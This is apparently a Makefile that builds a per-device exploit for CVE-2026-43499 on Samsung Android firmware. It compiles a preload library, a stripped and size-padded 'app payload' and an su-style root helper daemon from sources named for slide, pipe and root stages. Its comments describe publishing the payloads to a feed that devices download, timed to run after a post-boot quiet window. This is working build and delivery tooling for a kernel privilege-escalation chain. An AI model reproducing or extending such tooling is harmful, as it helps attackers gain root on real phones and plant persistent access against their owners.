API ?= 35
TARGET ?= pa3q-S938NKSUACZF1
OUTDIR ?= build/$(TARGET)

APP_TARGET_CFLAGS :=
ifeq ($(TARGET),dm2q-S916BXXSAFZG1)
APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
endif
ifeq ($(TARGET),dm3q-S918BXXSAFZF5)
APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
endif
ifeq ($(TARGET),gts9u-X916BXXS6EZG3)
APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
endif
ifeq ($(TARGET),dm1q-S911U1UES6DYI3)
APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
endif
ifeq ($(TARGET),gts9-X710XXS6EZF1)
APP_TARGET_CFLAGS := -DSLIDE_STACK_WRITER=1
endif
ifeq ($(TARGET),a53x-A536EXXSNGZG3)
API := 31
endif

TARGET_HEADER := src/targets/$(TARGET)/target.h
TARGET_INCLUDE := targets/$(TARGET)/target.h
UNAME_S := $(shell uname -s)
ifeq ($(UNAME_S),Darwin)
TARGET_CC := $(ANDROID_NDK_HOME)/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android$(API)-clang
else
TARGET_CC := $(ANDROID_NDK_HOME)/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android$(API)-clang
endif

ifeq ($(wildcard $(TARGET_CC)),)
$(error set ANDROID_NDK_HOME to an Android NDK containing $(TARGET_CC))
endif

PRELOAD := $(OUTDIR)/cve-2026-43499
APP_PRELOAD := $(OUTDIR)/cve-2026-43499-app.so
APP_RELEASE := $(OUTDIR)/cve-2026-43499-app.release.so
APP_STABLE := $(OUTDIR)/cve-2026-43499-app.stable.so
APP_RELEASE_SIZE := 104128

# Which recipe a published artifact for this target comes from, written down per target.
#
# `artifacts/` is not one kind of file. Half of it is the fixed-size payload - the `release` recipe,
# which is -Oz, sectioned, stripped and padded to APP_RELEASE_SIZE - and half is the plain `all` build.
# Which one a target gets is a fact about that target rather than a preference here: a feed entry
# declares a size, that size is what the device checks after downloading, and the two builds do not
# share one. So the default is the documented fixed-size build, and the targets that are published
# plain are named: their entries declare the plain build's size, and their devices have been running
# it. Moving one of them is a rebuild of that device's payload and belongs in its own change.
#
# The three e3q-S928 targets are the third case and the reason this is a table rather than a flag:
# `stable` is the fixed-size build with `APP_S928_STABLE_RACE=1`, which is what the S928 validation
# records name.
#
# The workflow publishes the file this names, so a build that publishes cannot disagree with this file
# about what publishing means: `make -s TARGET=... info` answers it.
APP_PUBLISH_RECIPES := \
  a36xq-A366WVLS3AYG1=all \
  dm1q-S911U1UES6DYI3=all \
  dm3q-S9180ZHS8FZF5=all \
  dm3q-S918BXXSAFZF5=all \
  gts9-X710XXS6EZF1=all \
  e3q-S9280ZCS6DZF2=stable \
  e3q-S928BXXS6DZF2=stable \
  e3q-S928USQS6DZF2=stable \
  pa2q-S9360ZCSCCZG1=all \
  psq-S9370ZCS9CZG1=all \
  q7q-F966BXXSBBZG3=all \
  q7q-F966USQSBBZG3=all \
  q7q-F966USQU9BZDN=all

APP_PUBLISH_RECIPE := $(or \
  $(patsubst $(TARGET)=%,%,$(filter $(TARGET)=%,$(APP_PUBLISH_RECIPES))),release)

# The file that recipe writes, which is the artifact a feed entry names.
APP_PUBLISH_ARTIFACT := $(if $(filter all,$(APP_PUBLISH_RECIPE)),$(APP_PRELOAD),\
  $(if $(filter stable,$(APP_PUBLISH_RECIPE)),$(APP_STABLE),$(APP_RELEASE)))

# The fixed size the published artifact is padded to, or empty for the plain build, which has none - so
# that a check on the artifact's byte count is about the recipes that make that promise.
APP_PUBLISH_SIZE := $(if $(filter all,$(APP_PUBLISH_RECIPE)),,$(APP_RELEASE_SIZE))
ROOT_HELPER := $(OUTDIR)/cve-2026-43499-root
TARGET_CFLAGS :=
APP_RELEASE_OPT := -Oz
APP_RELEASE_LINK_FLAGS := -Wl,--gc-sections -Wl,--icf=all -s

PRELOAD_SRCS := \
  src/main.c \
  src/util.c \
  src/slide.c \
  src/fops.c \
  src/pipe.c \
  src/root.c \
  src/preload.c

APP_PRELOAD_SRCS := \
  src/main.c \
  src/util.c \
  src/slide_app.c \
  src/fops.c \
  src/pipe.c \
  src/root.c \
  src/preload.c

ifeq ($(TARGET),a53x-A536EXXSNGZG3)
APP_PRELOAD_SRCS := \
  src/targets/a53x-A536EXXSNGZG3/payload.c \
  src/targets/a53x-A536EXXSNGZG3/chain.c \
  src/targets/a53x-A536EXXSNGZG3/ghostlock.c \
  src/targets/a53x-A536EXXSNGZG3/page.c
PRELOAD_SRCS := $(APP_PRELOAD_SRCS)
APP_RELEASE_OPT := -O2
APP_RELEASE_LINK_FLAGS := -Wl,--gc-sections -Wl,--icf=all -s
endif

COMMON_CFLAGS := \
  -O2 -g0 -Wall -Wextra \
  -Wno-unused-parameter -Wno-sign-compare \
  -Isrc -DTARGET_HEADER='"$(TARGET_INCLUDE)"' \
  $(TARGET_CFLAGS)

.DEFAULT_GOAL := all

.PHONY: all clean info release stable

all: $(PRELOAD) $(APP_PRELOAD) $(ROOT_HELPER)

release: $(APP_RELEASE)

stable: $(APP_STABLE)

$(OUTDIR):
	mkdir -p $@

$(PRELOAD): $(PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
	$(TARGET_CC) -fPIC $(COMMON_CFLAGS) $(PRELOAD_SRCS) \
	  -shared -pthread -o $@

$(ROOT_HELPER): src/su_daemon.c | $(OUTDIR)
	$(TARGET_CC) -fPIE -pie -O2 -g0 -Wall -Wextra $< -ldl -o $@

$(APP_PRELOAD): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
	$(TARGET_CC) -DAPP_PAYLOAD=1 $(APP_TARGET_CFLAGS) -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
	  -shared -pthread -o $@

$(APP_RELEASE): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
	$(TARGET_CC) -DAPP_PAYLOAD=1 $(APP_TARGET_CFLAGS) -fPIC $(APP_RELEASE_OPT) -g0 \
	  -fno-unwind-tables -fno-asynchronous-unwind-tables \
	  -ffunction-sections -fdata-sections \
	  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
	  -Isrc -DTARGET_HEADER='"$(TARGET_INCLUDE)"' \
	  $(TARGET_CFLAGS) \
	  $(APP_PRELOAD_SRCS) -shared -pthread \
	  $(APP_RELEASE_LINK_FLAGS) -o $@
	@test $$(stat -c %s $@) -le $(APP_RELEASE_SIZE)
	truncate -s $(APP_RELEASE_SIZE) $@

$(APP_STABLE): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
	$(TARGET_CC) -DAPP_PAYLOAD=1 -DAPP_S928_STABLE_RACE=1 \
	  -fPIC -Oz -g0 -fvisibility=hidden -fno-semantic-interposition \
	  -fstack-protector-strong \
	  -fno-unwind-tables -fno-asynchronous-unwind-tables \
	  -ffunction-sections -fdata-sections \
	  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
	  -Isrc -DTARGET_HEADER='"$(TARGET_INCLUDE)"' \
	  $(APP_PRELOAD_SRCS) -shared -pthread \
	  -Wl,--gc-sections -Wl,--icf=all -s -o $@
	@test $$(stat -c %s $@) -le $(APP_RELEASE_SIZE)
	truncate -s $(APP_RELEASE_SIZE) $@

# `APP_QUIET_WINDOW` answers whether this target's app payload is built from the preload chain at
# all, which is the chain that waits out the post-boot quiet window. A target built without it - the
# a53x/ghostlock sources never include `src/preload.c` - has no such variable for CI to look for, so a
# check that asked every artifact would fail on it. The answer comes off the source list above rather
# than a list kept beside the workflow, so a target that moves between the two builds moves here too.
#
# `APP_PUBLISH_RECIPE`, `APP_PUBLISH_ARTIFACT` and `APP_PUBLISH_SIZE` are the same kind of answer for
# the other half of that check: which build a device will download, the file it comes from, and the byte
# count it is promised.
#
# `APP_FLAVOR_ARTIFACTS` answers the same question for every recipe at once - `all:$(APP_PRELOAD)`,
# `release:$(APP_RELEASE)`, `stable:$(APP_STABLE)` - so a caller can name a recipe to build without
# knowing how it is spelt here, and find what it wrote. Those are the three builds a device can be
# handed, and only one of them is the published one.
info:
	@echo "TARGET=$(TARGET)"
	@echo "APP_TARGET_CFLAGS=$(APP_TARGET_CFLAGS)"
	@echo "APP_QUIET_WINDOW=$(if $(findstring src/preload.c,$(APP_PRELOAD_SRCS)),yes,no)"
	@echo "APP_PUBLISH_RECIPE=$(APP_PUBLISH_RECIPE)"
	@echo "APP_PUBLISH_ARTIFACT=$(APP_PUBLISH_ARTIFACT)"
	@echo "APP_PUBLISH_SIZE=$(APP_PUBLISH_SIZE)"
	@echo "APP_FLAVOR_ARTIFACTS=all:$(APP_PRELOAD) release:$(APP_RELEASE) stable:$(APP_STABLE)"
	@echo "TARGET_CC=$(TARGET_CC)"
	@echo "PRELOAD=$(PRELOAD)"
	@echo "APP_PRELOAD=$(APP_PRELOAD)"
	@echo "APP_RELEASE=$(APP_RELEASE)"
	@echo "APP_STABLE=$(APP_STABLE)"
	@echo "ROOT_HELPER=$(ROOT_HELPER)"

clean:
	rm -rf $(OUTDIR)
